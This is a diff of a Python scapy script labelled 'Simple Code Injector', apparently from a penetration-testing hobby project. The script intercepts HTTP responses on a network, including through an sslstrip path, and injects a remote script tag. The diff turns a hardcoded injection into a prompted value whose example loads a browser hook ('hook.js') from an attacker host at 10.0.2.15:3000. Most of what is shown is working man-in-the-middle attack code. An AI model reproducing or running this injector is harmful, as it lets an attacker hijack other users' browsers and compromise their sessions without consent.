@@ -23,7 +23,6 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 10000:
             print("[+] Response")
-            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
             print("[+] Injecting!")
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
@@ -41,4 +40,5 @@ def process_packet(packet):
 
 print("Simple Code Injector 0.01 by Ravehorn")
 destination = raw_input("Destination (sslstrip, forward, local) -> ")
+injection_code = raw_input('Injection code (<script src="http://10.0.2.15:3000/hook.js"></script>) -> ')
 queue = SNFQ(process_packet, destination=destination)
